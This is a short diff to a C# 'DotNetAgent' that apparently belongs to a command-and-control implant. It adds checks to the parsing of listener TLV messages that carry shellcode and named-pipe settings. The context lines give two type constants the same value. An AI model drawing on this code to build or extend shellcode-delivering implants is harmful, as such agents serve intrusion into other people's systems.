@@ -24,6 +24,9 @@ namespace DotNetAgent
         private const byte TLV_TYPE_IV = 0x4;
         private const byte TLV_TYPE_PIPENAME = 0x4;
         private const byte TLV_TYPE_CONF = 0x5;
+        private const byte TLV_TYPE_EXEC_UNIT_CONF = 0x7;
+        private const byte TLV_TYPE_EXECUTION_FORMAT = 0x1;
+        private const byte EXECUTION_FORMAT_SHELLCODE = 0x0;
         private const byte TLV_TYPE_CYPHERTEXT = 0x10;
         private const byte TLV_TYPE_LISTENER_NEW_CONF = 0x20;
         private static readonly byte[] TLV_VALUE_YES = new byte[] { 0x1 };
@@ -43,9 +46,26 @@ namespace DotNetAgent
             if (!tlv.HasChild(TLV_TYPE_SHELLCODE) || !tlv.HasChild(TLV_TYPE_PIPENAME))
                 return false;
             _shellcode = tlv.GetChild(TLV_TYPE_SHELLCODE).Data;
+            if (_shellcode == null || _shellcode.Length == 0)
+                return false;
             _pipeName = tlv.GetChild(TLV_TYPE_PIPENAME).GetAsString();
+            if (string.IsNullOrWhiteSpace(_pipeName))
+                return false;
             if (tlv.HasChild(TLV_TYPE_CONF))
                 _conf = tlv.GetChild(TLV_TYPE_CONF).Data;
+            // Legacy listener TLVs have no exec-unit configuration and contain shellcode.
+            if (tlv.HasChild(TLV_TYPE_EXEC_UNIT_CONF))
+            {
+                TLV execUnitConf = tlv.GetChild(TLV_TYPE_EXEC_UNIT_CONF);
+                if (!execUnitConf.IsParent || !execUnitConf.HasChild(TLV_TYPE_EXECUTION_FORMAT))
+                    return false;
+                byte executionFormat = execUnitConf.GetChild(TLV_TYPE_EXECUTION_FORMAT).GetAsByte();
+                if (executionFormat != EXECUTION_FORMAT_SHELLCODE)
+                {
+                    Logger.Warning($"Unsupported listener exec-unit format: {executionFormat}");
+                    return false;
+                }
+            }
             TLV agentConfiguration = tlv.GetChild(TLV_TYPE_AGENT_CONFIGURATION);
             if (agentConfiguration != null &&
                 (agentConfiguration.IsParent || agentConfiguration.Data == null || agentConfiguration.Data.Length != sizeof(long)))
